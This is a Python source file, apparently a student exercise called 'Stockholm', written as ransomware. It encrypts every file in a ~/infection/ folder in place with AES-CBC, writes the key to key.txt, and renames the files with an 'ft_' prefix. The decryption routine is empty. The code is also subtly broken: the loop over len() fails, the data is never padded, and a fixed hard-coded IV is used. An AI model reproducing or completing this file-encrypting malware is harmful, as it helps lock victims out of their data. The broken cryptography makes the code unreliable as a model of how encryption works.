import os
from utils import Arguments, Extensions
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import hashlib

extensions = []

class Stockholm(Arguments, Extensions):
    def __init__(self):
        super().__init__()
        if self.version:
            self.display_version()
        if self.help:
            self.display_help()
            exit()
        self.iv = "Red-Taylor-Swift"
        self.path = os.path.expanduser("~/infection/")
        self.files = [file for file in os.listdir(self.path) if os.path.isfile(self.path + file)]
        self.files_ext = [self.path + f for f in self.files]
        if self.reverse is None:
            
            self.raw_key = get_random_bytes(8)

            # print(f'This is your raw key: {(self.raw_key)}')            
            # print(f'Len: {len(self.raw_key)}')
            self.key = self.raw_key.hex()
            print(f"This is your key: {(self.key)}")
            # print(f'Len: {len(self.key)}')
            # print(f'Decode: {bytes.fromhex(self.key)}')
            print("Test:", hashlib.sha256(self.raw_key).digest()[:16])
            # print("Test2:", hashlib.sha256(bytes.fromhex(self.key)).digest()[:16])
            self.raw_key = hashlib.sha256(self.raw_key).digest()[:16]
            with open("key.txt", 'wb') as f:
                f.write(self.key.encode())
            
        else :
            print(type(self.reverse[0]))
            self.key = self.reverse[0]
            self.raw_key = hashlib.sha256(bytes.fromhex(self.key)).digest()[:16]
            print("Test:", self.raw_key)
        print(type(self.raw_key))
        self.cipher = AES.new(self.raw_key, AES.MODE_CBC, self.iv.encode('utf-8'))
        print(self.files_ext)
    
    
    def encrypt(self):
        for i in len(self.files):
            f = self.files_ext[i]
            content = ""
            with open(f, 'rb') as r:
                content = r.read()
            print(content.decode())
            content = self.cipher.encrypt(content)
            with open(f, 'wb') as w:
                w.write(content)
            file_name = self.files[i]
            if file_name.startswith("ft_"):
                continue
            os.rename(f, self.path + "ft_" + file_name)
            print(f)
        return
    
    def decrypt(self):
        return
        
# l = os.listdir("./infection/")
# print(*l, sep="\n")

s = Stockholm()
